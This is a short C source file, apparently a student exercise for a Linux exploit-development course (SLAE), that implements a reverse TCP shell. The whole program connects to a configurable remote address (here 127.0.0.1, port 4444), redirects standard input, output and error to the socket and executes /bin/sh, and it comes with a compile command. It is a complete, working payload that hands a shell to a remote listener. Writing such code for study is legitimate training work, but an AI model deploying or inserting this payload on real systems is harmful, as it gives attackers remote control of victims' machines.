#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
 
/**
 * Reverse Bind TCP Shell
 * Student Id: SLAE-755
 * Thanks to:
 *  - http://blog.techorganic.com/2015/01/04/pegasus-hacking-challenge/
 *  - https://gist.github.com/0xabe-io/916cf3af33d1c0592a90
 * 
 * Compile: gcc -m32 reverse_bind_shell_tcp.c -o reverse_bind_shell_tcp
*/


#define REMOTE_ADDR "127.0.0.1"
#define REMOTE_PORT 4444

int main(int argc, char *argv[])
{
    struct sockaddr_in sa;
    int s;

    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
    sa.sin_port = htons(REMOTE_PORT);

    s = socket(AF_INET, SOCK_STREAM, 0);
    connect(s, (struct sockaddr *)&sa, sizeof(sa));
    dup2(s, 0);
    dup2(s, 1);
    dup2(s, 2);

    execve("/bin/sh", 0, 0);
    return 0;
}
